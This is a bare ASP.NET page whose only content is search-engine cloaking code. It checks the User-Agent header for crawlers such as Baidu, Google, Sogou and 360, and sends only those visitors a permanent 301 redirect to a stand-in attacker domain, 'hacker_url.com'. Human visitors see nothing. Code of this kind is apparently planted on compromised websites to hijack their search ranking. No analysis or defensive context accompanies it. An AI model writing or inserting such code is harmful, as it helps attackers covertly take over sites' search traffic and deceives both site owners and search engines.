<%@Page Language="C#"%>
<%
string s = Request.ServerVariables["HTTP_USER_AGENT"];
if(s.IndexOf("baidu")>-1 || s.IndexOf("soso")>-1|| s.IndexOf("google")>-1 || s.IndexOf("360")>-1 || s.IndexOf("sogou")>-1 || s.IndexOf("spider")>-1){
    Response.Status = "301 Moved Permanently";
    Response.AddHeader("Location","http://www.hacker_url.com/");
    Response.AddHeader("Connection","close");
}
%>